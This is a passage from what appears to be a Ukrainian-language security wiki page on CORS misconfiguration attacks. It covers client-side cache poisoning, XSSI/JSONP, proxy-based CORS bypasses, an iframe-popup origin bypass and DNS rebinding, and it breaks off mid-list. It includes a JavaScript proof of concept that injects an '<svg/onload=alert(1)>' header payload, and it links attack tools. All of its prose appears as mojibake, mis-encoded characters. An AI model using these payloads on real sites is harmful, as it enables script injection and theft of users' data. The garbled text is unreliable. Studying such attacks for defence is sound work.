**–ü—Ä–∏–º—ñ—Ç–∫–∞**: –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —ñ–Ω'—î–∫—Ü—ñ—ó HTTP-–∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤, –∑–æ–∫—Ä–µ–º–∞ —á–µ—Ä–µ–∑ –æ—Ç—Ä—É—î–Ω–Ω—è –∫–µ—à—É –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞, –ø—ñ–¥–∫—Ä–µ—Å–ª—é—î –∫—Ä–∏—Ç–∏—á–Ω—É –≤–∞–∂–ª–∏–≤—ñ—Å—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ç–∞ –æ—á–∏—â–µ–Ω–Ω—è –≤—Å—ñ—Ö –≤–≤–µ–¥–µ–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º –¥–∞–Ω–∏—Ö, –≤–∫–ª—é—á–∞—é—á–∏ HTTP-–∑–∞–≥–æ–ª–æ–≤–∫–∏. –ó–∞–≤–∂–¥–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –Ω–∞–¥—ñ–π–Ω—É –º–æ–¥–µ–ª—å –±–µ–∑–ø–µ–∫–∏, —è–∫–∞ –≤–∫–ª—é—á–∞—î –ø–µ—Ä–µ–≤—ñ—Ä–∫—É –≤–≤–µ–¥–µ–Ω–∏—Ö –¥–∞–Ω–∏—Ö, —â–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ —Ç–∞–∫–∏–º –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—è–º.

### **–û—Ç—Ä—É—î–Ω–Ω—è –∫–µ—à—É –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ –∫–ª—ñ—î–Ω—Ç–∞**

[**–ó —Ü—å–æ–≥–æ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

–£ —Ü—å–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –µ–∫–∑–µ–º–ø–ª—è—Ä –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫–∏, —â–æ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î –≤–º—ñ—Å—Ç —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ–≥–æ HTTP-–∑–∞–≥–æ–ª–æ–≤–∫–∞ –±–µ–∑ –Ω–∞–ª–µ–∂–Ω–æ–≥–æ –∫–æ–¥—É–≤–∞–Ω–Ω—è. –ó–æ–∫—Ä–µ–º–∞, –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫–∞ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î –≤–º—ñ—Å—Ç, –≤–∫–ª—é—á–µ–Ω–∏–π —É –∑–∞–≥–æ–ª–æ–≤–æ–∫ `X-User-id`, —è–∫–∏–π –º–æ–∂–µ –º—ñ—Å—Ç–∏—Ç–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π JavaScript, —è–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –≤ –ø—Ä–∏–∫–ª–∞–¥—ñ, –¥–µ –∑–∞–≥–æ–ª–æ–≤–æ–∫ –º—ñ—Å—Ç–∏—Ç—å —Ç–µ–≥ SVG-–∏–∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è JavaScript-–∫–æ–¥—É –ø—Ä–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ.

–ü–æ–ª—ñ—Ç–∏–∫–∏ Cross-Origin Resource Sharing (CORS) –¥–æ–∑–≤–æ–ª—è—é—Ç—å –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏. –û–¥–Ω–∞–∫, —è–∫—â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–µ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î—Ç—å—Å—è –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –±—Ä–∞—É–∑–µ—Ä–æ–º —á–µ—Ä–µ–∑ –æ–±–º–µ–∂–µ–Ω–Ω—è CORS, –∫–æ—Ä–∏—Å–Ω—ñ—Å—Ç—å —Ç–∞–∫–æ—ó —ñ–Ω'—î–∫—Ü—ñ—ó –º–æ–∂–µ –∑–¥–∞–≤–∞—Ç–∏—Å—è –æ–±–º–µ–∂–µ–Ω–æ—é. –ö—Ä–∏—Ç–∏—á–Ω–∏–π –º–æ–º–µ–Ω—Ç –≤–∏–Ω–∏–∫–∞—î –ø—Ä–∏ —Ä–æ–∑–≥–ª—è–¥—ñ –ø–æ–≤–µ–¥—ñ–Ω–∫–∏ –∫–µ—à—É –±—Ä–∞—É–∑–µ—Ä–∞. –Ø–∫—â–æ –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Vary: Origin` –Ω–µ –≤–∫–∞–∑–∞–Ω–æ, —Å—Ç–∞—î –º–æ–∂–ª–∏–≤–∏–º, —â–æ–± —à–∫—ñ–¥–ª–∏–≤–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –±—É–ª–∞ –∫–µ—à–æ–≤–∞–Ω–∞ –±—Ä–∞—É–∑–µ—Ä–æ–º. –í –ø–æ–¥–∞–ª—å—à–æ–º—É —Ü—è –∫–µ—à–æ–≤–∞–Ω–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –º–æ–∂–µ –±—É—Ç–∏ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–∞ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –ø—Ä–∏ –ø–µ—Ä–µ—Ö–æ–¥—ñ –∑–∞ URL, –æ–±—Ö–æ–¥—è—á–∏ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ—Å—Ç—å –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ–≥–æ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è –ø—ñ–¥ —á–∞—Å –ø–æ—á–∞—Ç–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Ç—É. –¶–µ–π –º–µ—Ö–∞–Ω—ñ–∑–º –ø—ñ–¥–≤–∏—â—É—î –Ω–∞–¥—ñ–π–Ω—ñ—Å—Ç—å –∞—Ç–∞–∫–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∫–µ—à—É–≤–∞–Ω–Ω—è –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ –∫–ª—ñ—î–Ω—Ç–∞.

–©–æ–± –ø—Ä–æ—ñ–ª—é—Å—Ç—Ä—É–≤–∞—Ç–∏ —Ü—é –∞—Ç–∞–∫—É, –Ω–∞–≤–æ–¥–∏—Ç—å—Å—è –ø—Ä–∏–∫–ª–∞–¥ JavaScript, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —á–µ—Ä–µ–∑ JSFiddle. –¶–µ–π —Å–∫—Ä–∏–ø—Ç –≤–∏–∫–æ–Ω—É—î –ø—Ä–æ—Å—Ç—É –¥—ñ—é: –≤—ñ–Ω –Ω–∞–¥—Å–∏–ª–∞—î –∑–∞–ø–∏—Ç –¥–æ –≤–∫–∞–∑–∞–Ω–æ–≥–æ URL –∑ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–∏–º –∑–∞–≥–æ–ª–æ–≤–∫–æ–º, —â–æ –º—ñ—Å—Ç–∏—Ç—å —à–∫—ñ–¥–ª–∏–≤–∏–π JavaScript. –ü—ñ—Å–ª—è —É—Å–ø—ñ—à–Ω–æ–≥–æ –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è –∑–∞–ø–∏—Ç—É –≤—ñ–Ω –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –ø–µ—Ä–µ–π—Ç–∏ –¥–æ —Ü—ñ–ª—å–æ–≤–æ–≥–æ URL, –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –≤–∏–∫–ª–∏–∫–∞—é—á–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —ñ–Ω'—î–∫–æ–≤–∞–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç—É, —è–∫—â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –±—É–ª–∞ –∫–µ—à–æ–≤–∞–Ω–∞ –±–µ–∑ –Ω–∞–ª–µ–∂–Ω–æ—ó –æ–±—Ä–æ–±–∫–∏ –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Vary: Origin`.

–û—Å—å –∫–æ—Ä–æ—Ç–∫–∏–π –æ–≥–ª—è–¥ JavaScript, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ–≥–æ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ü—ñ—î—ó –∞—Ç–∞–∫–∏:
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Bypass

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI, —Ç–∞–∫–æ–∂ –≤—ñ–¥–æ–º–∏–π —è–∫ Cross-Site Script Inclusion, —î —Ç–∏–ø–æ–º –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ, —è–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ç–æ–π —Ñ–∞–∫—Ç, —â–æ –ü–æ–ª—ñ—Ç–∏–∫–∞ –æ–¥–Ω–æ–≥–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è (SOP) –Ω–µ –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è –ø—Ä–∏ –≤–∫–ª—é—á–µ–Ω–Ω—ñ —Ä–µ—Å—É—Ä—Å—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–µ–≥—É script. –¶–µ –ø–æ–≤'—è–∑–∞–Ω–æ –∑ —Ç–∏–º, —â–æ —Å–∫—Ä–∏–ø—Ç–∏ –ø–æ–≤–∏–Ω–Ω—ñ –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∫–ª—é—á–∞—Ç–∏—Å—è –∑ —Ä—ñ–∑–Ω–∏—Ö –¥–æ–º–µ–Ω—ñ–≤. –¶—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–æ—Å—Ç—É–ø —ñ —á–∏—Ç–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç, —è–∫–∏–π –±—É–≤ –≤–∫–ª—é—á–µ–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–µ–≥—É script.

–¶—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —Å—Ç–∞—î –æ—Å–æ–±–ª–∏–≤–æ –∑–Ω–∞—á—É—â–æ—é, –∫–æ–ª–∏ –π–¥–µ—Ç—å—Å—è –ø—Ä–æ –¥–∏–Ω–∞–º—ñ—á–Ω–∏–π JavaScript –∞–±–æ JSONP (JSON –∑ Padding), –æ—Å–æ–±–ª–∏–≤–æ –∫–æ–ª–∏ –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–∞–Ω—ñ –ø—Ä–æ –Ω–∞–≤–∫–æ–ª–∏—à–Ω—î —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ, —Ç–∞–∫—ñ —è–∫ –∫—É–∫–∏. –ü—Ä–∏ –∑–∞–ø–∏—Ç—ñ —Ä–µ—Å—É—Ä—Å—É –∑ —ñ–Ω—à–æ–≥–æ —Ö–æ—Å—Ç–∞ –∫—É–∫–∏ –≤–∫–ª—é—á–∞—é—Ç—å—Å—è, —â–æ —Ä–æ–±–∏—Ç—å —ó—Ö –¥–æ—Å—Ç—É–ø–Ω–∏–º–∏ –¥–ª—è –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞.

–©–æ–± –∫—Ä–∞—â–µ –∑—Ä–æ–∑—É–º—ñ—Ç–∏ —ñ –ø–æ–º'—è–∫—à–∏—Ç–∏ —Ü—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø–ª–∞–≥—ñ–Ω BurpSuite, –¥–æ—Å—Ç—É–ø–Ω–∏–π –∑–∞ –∞–¥—Ä–µ—Å–æ—é [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp). –¶–µ–π –ø–ª–∞–≥—ñ–Ω –º–æ–∂–µ –¥–æ–ø–æ–º–æ–≥—Ç–∏ –≤–∏—è–≤–∏—Ç–∏ —Ç–∞ —É—Å—É–Ω—É—Ç–∏ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ XSSI —É –≤–∞—à–∏—Ö –≤–µ–±-–¥–æ–¥–∞—Ç–∫–∞—Ö.

[**–ß–∏—Ç–∞—Ç–∏ –±—ñ–ª—å—à–µ –ø—Ä–æ —Ä—ñ–∑–Ω—ñ —Ç–∏–ø–∏ XSSI —Ç–∞ —è–∫ —ó—Ö –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —Ç—É—Ç.**](xssi-cross-site-script-inclusion.md)

–°–ø—Ä–æ–±—É–π—Ç–µ –¥–æ–¥–∞—Ç–∏ **`callback`** **–ø–∞—Ä–∞–º–µ—Ç—Ä** —É –∑–∞–ø–∏—Ç. –ú–æ–∂–ª–∏–≤–æ, —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –±—É–ª–∞ –ø—ñ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω–∞ –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–∏—Ö —è–∫ JSONP. –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –ø–æ–≤–µ—Ä–Ω–µ –¥–∞–Ω—ñ –∑ `Content-Type: application/javascript`, —â–æ –æ–±—ñ–π–¥–µ –ø–æ–ª—ñ—Ç–∏–∫—É CORS.

![](<../.gitbook/assets/image (856).png>)

### –õ–µ–≥–∫–∏–π (–º–∞—Ä–Ω–∏–π?) –æ–±—Ö—ñ–¥

–û–¥–∏–Ω –∑—ñ —Å–ø–æ—Å–æ–±—ñ–≤ –æ–±—ñ–π—Ç–∏ –æ–±–º–µ–∂–µ–Ω–Ω—è `Access-Control-Allow-Origin` - —Ü–µ –∑–∞–ø–∏—Ç–∞—Ç–∏ –≤–µ–±-–¥–æ–¥–∞—Ç–æ–∫, —â–æ–± –≤—ñ–Ω –∑—Ä–æ–±–∏–≤ –∑–∞–ø–∏—Ç –≤—ñ–¥ –≤–∞—à–æ–≥–æ —ñ–º–µ–Ω—ñ —Ç–∞ –Ω–∞–¥—ñ—Å–ª–∞–≤ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞–∑–∞–¥. –û–¥–Ω–∞–∫ —É —Ü—å–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –∫—ñ–Ω—Ü–µ–≤–æ—ó –∂–µ—Ä—Ç–≤–∏ –Ω–µ –±—É–¥—É—Ç—å –Ω–∞–¥—ñ—Å–ª–∞–Ω—ñ, –æ—Å–∫—ñ–ª—å–∫–∏ –∑–∞–ø–∏—Ç —Ä–æ–±–∏—Ç—å—Å—è –¥–æ —ñ–Ω—à–æ–≥–æ –¥–æ–º–µ–Ω—É.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): –¶–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –Ω–∞–¥–∞—î –ø—Ä–æ–∫—Å—ñ, —è–∫–∏–π –ø–µ—Ä–µ—Å–∏–ª–∞—î –≤–∞—à –∑–∞–ø–∏—Ç —Ä–∞–∑–æ–º –∑ –π–æ–≥–æ –∑–∞–≥–æ–ª–æ–≤–∫–∞–º–∏, –æ–¥–Ω–æ—á–∞—Å–Ω–æ –ø—ñ–¥—Ä–æ–±–ª—è—é—á–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ Origin, —â–æ–± –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—Ç–∏ –∑–∞–ø–∏—Ç–∞–Ω–æ–º—É –¥–æ–º–µ–Ω—É. –¶–µ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –æ–±—ñ–π–º–∞—î –ø–æ–ª—ñ—Ç–∏–∫—É CORS. –û—Å—å –ø—Ä–∏–∫–ª–∞–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∑ XMLHttpRequest:
2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): –¶–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –ø—Ä–æ–ø–æ–Ω—É—î –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–∏–π –ø—ñ–¥—Ö—ñ–¥ –¥–æ –ø—Ä–æ–∫—Å–∏—Ä—É–≤–∞–Ω–Ω—è –∑–∞–ø–∏—Ç—ñ–≤. –ó–∞–º—ñ—Å—Ç—å —Ç–æ–≥–æ, —â–æ–± –ø–µ—Ä–µ–¥–∞–≤–∞—Ç–∏ –≤–∞—à –∑–∞–ø–∏—Ç —è–∫ —î, —Å–µ—Ä–≤–µ—Ä —Ä–æ–±–∏—Ç—å —Å–≤—ñ–π –≤–ª–∞—Å–Ω–∏–π –∑–∞–ø–∏—Ç –∑ –≤–∫–∞–∑–∞–Ω–∏–º–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏.

### Iframe + Popup Bypass

–í–∏ –º–æ–∂–µ—Ç–µ **–æ–±—ñ–π—Ç–∏ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ CORS**, —Ç–∞–∫—ñ —è–∫ `e.origin === window.origin`, —Å—Ç–≤–æ—Ä–∏–≤—à–∏ **iframe** —ñ **–∑ –Ω—å–æ–≥–æ –≤—ñ–¥–∫—Ä–∏–≤–∞—é—á–∏ –Ω–æ–≤–µ –≤—ñ–∫–Ω–æ**. –ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### DNS Rebinding —á–µ—Ä–µ–∑ TTL

DNS rebinding —á–µ—Ä–µ–∑ TTL - —Ü–µ —Ç–µ—Ö–Ω—ñ–∫–∞, —è–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –æ–±—Ö–æ–¥—É –ø–µ–≤–Ω–∏—Ö –∑–∞—Ö–æ–¥—ñ–≤ –±–µ–∑–ø–µ–∫–∏ —à–ª—è—Ö–æ–º –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è DNS-–∑–∞–ø–∏—Å–∞–º–∏. –û—Å—å —è–∫ —Ü–µ –ø—Ä–∞—Ü—é—î:

1. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ —Å—Ç–≤–æ—Ä—é—î –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫—É —ñ –∑–º—É—à—É—î –∂–µ—Ä—Ç–≤—É –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ –Ω–µ—ó –¥–æ—Å—Ç—É–ø.
2. –ü–æ—Ç—ñ–º –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º—ñ–Ω—é—î DNS (IP) —Å–≤–æ–≥–æ –¥–æ–º–µ–Ω—É, —â–æ–± –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫—É –∂–µ—Ä—Ç–≤–∏.
3. –ë—Ä–∞—É–∑–µ—Ä –∂–µ—Ä—Ç–≤–∏ –∫–µ—à—É—î –≤—ñ–¥–ø–æ–≤—ñ–¥—å DNS, —è–∫–∞ –º–æ–∂–µ –º–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è TTL (Time to Live), —â–æ –≤–∫–∞–∑—É—î, —è–∫ –¥–æ–≤–≥–æ DNS-–∑–∞–ø–∏—Å –ø–æ–≤–∏–Ω–µ–Ω –≤–≤–∞–∂–∞—Ç–∏—Å—è –¥—ñ–π—Å–Ω–∏–º.
4. –ö–æ–ª–∏ TTL –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è, –±—Ä–∞—É–∑–µ—Ä –∂–µ—Ä—Ç–≤–∏ —Ä–æ–±–∏—Ç—å –Ω–æ–≤–∏–π DNS-–∑–∞–ø–∏—Ç, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ JavaScript-–∫–æ–¥ –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –∂–µ—Ä—Ç–≤–∏.
5. –ü—ñ–¥—Ç—Ä–∏–º—É—é—á–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ IP –∂–µ—Ä—Ç–≤–∏, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –∑–±–∏—Ä–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –∑ –∂–µ—Ä—Ç–≤–∏, –Ω–µ –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ –∂–æ–¥–Ω–∏—Ö –∫—É–∫—ñ–≤ –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∂–µ—Ä—Ç–≤–∏.

–í–∞–∂–ª–∏–≤–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ –±—Ä–∞—É–∑–µ—Ä–∏ –º–∞—é—Ç—å –º–µ—Ö–∞–Ω—ñ–∑–º–∏ –∫–µ—à—É–≤–∞–Ω–Ω—è, —è–∫—ñ –º–æ–∂—É—Ç—å –∑–∞–ø–æ–±—ñ–≥—Ç–∏ –Ω–µ–≥–∞–π–Ω–æ–º—É –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—é —Ü—ñ—î—é —Ç–µ—Ö–Ω—ñ–∫–æ—é, –Ω–∞–≤—ñ—Ç—å –∑ –Ω–∏–∑—å–∫–∏–º–∏ –∑–Ω–∞—á–µ–Ω–Ω—è–º–∏ TTL.

DNS rebinding –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–º –¥–ª—è –æ–±—Ö–æ–¥—É —è–≤–Ω–∏—Ö –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ IP, —è–∫—ñ –≤–∏–∫–æ–Ω—É—î –∂–µ—Ä—Ç–≤–∞, –∞–±–æ –¥–ª—è —Å—Ü–µ–Ω–∞—Ä—ñ—ó–≤, –∫–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∞–±–æ –±–æ—Ç –∑–∞–ª–∏—à–∞—î—Ç—å—Å—è –Ω–∞ –æ–¥–Ω—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –ø—Ä–æ—Ç—è–≥–æ–º —Ç—Ä–∏–≤–∞–ª–æ–≥–æ —á–∞—Å—É, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∫–µ—à—É –∑–∞–∫—ñ–Ω—á–∏—Ç–∏—Å—è.

–Ø–∫—â–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–µ–Ω —à–≤–∏–¥–∫–∏–π —Å–ø–æ—Å—ñ–± –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ DNS rebinding, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Å–µ—Ä–≤—ñ—Å–∏, —Ç–∞–∫—ñ —è–∫ [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).

–©–æ–± –∑–∞–ø—É—Å—Ç–∏—Ç–∏ —Å–≤—ñ–π –≤–ª–∞—Å–Ω–∏–π —Å–µ—Ä–≤–µ—Ä DNS rebinding, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)). –¶–µ –ø–µ—Ä–µ–¥–±–∞—á–∞—î –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è –≤–∞—à–æ–≥–æ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø–æ—Ä—Ç—É 53/udp, —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è A-–∑–∞–ø–∏—Å—É, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ –Ω—å–æ–≥–æ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, ns.example.com), —ñ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è NS-–∑–∞–ø–∏—Å—É, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ —Ä–∞–Ω—ñ—à–µ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π A-—Å—É–±–¥–æ–º–µ–Ω (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, ns.example.com). –ë—É–¥—å-—è–∫–∏–π —Å—É–±–¥–æ–º–µ–Ω ns.example.com –±—É–¥–µ —Ä–æ–∑–≤'—è–∑–∞–Ω–∏–π –≤–∞—à–∏–º —Ö–æ—Å—Ç–æ–º.

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –¥–æ—Å–ª—ñ–¥–∏—Ç–∏ –ø—É–±–ª—ñ—á–Ω–æ –ø—Ä–∞—Ü—é—é—á–∏–π —Å–µ—Ä–≤–µ—Ä –∑–∞ –∞–¥—Ä–µ—Å–æ—é [http://rebind.it/singularity.html](http://rebind.it/singularity.html) –¥–ª—è –ø–æ–¥–∞–ª—å—à–æ–≥–æ —Ä–æ–∑—É–º—ñ–Ω–Ω—è —Ç–∞ –µ–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç—ñ–≤.

### DNS Rebinding —á–µ—Ä–µ–∑ **DNS Cache Flooding**

DNS rebinding —á–µ—Ä–µ–∑ DNS cache flooding - —Ü–µ —â–µ –æ–¥–Ω–∞ —Ç–µ—Ö–Ω—ñ–∫–∞, —è–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –æ–±—Ö–æ–¥—É –º–µ—Ö–∞–Ω—ñ–∑–º—É –∫–µ—à—É–≤–∞–Ω–Ω—è –±—Ä–∞—É–∑–µ—Ä—ñ–≤ —ñ –ø—Ä–∏–º—É—à–µ–Ω–Ω—è –¥—Ä—É–≥–æ–≥–æ DNS-–∑–∞–ø–∏—Ç—É. –û—Å—å —è–∫ —Ü–µ –ø—Ä–∞—Ü—é—î:

1. –°–ø–æ—á–∞—Ç–∫—É, –∫–æ–ª–∏ –∂–µ—Ä—Ç–≤–∞ —Ä–æ–±–∏—Ç—å DNS-–∑–∞–ø–∏—Ç, –Ω–∞ –Ω—å–æ–≥–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î IP-–∞–¥—Ä–µ—Å–∞ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞.
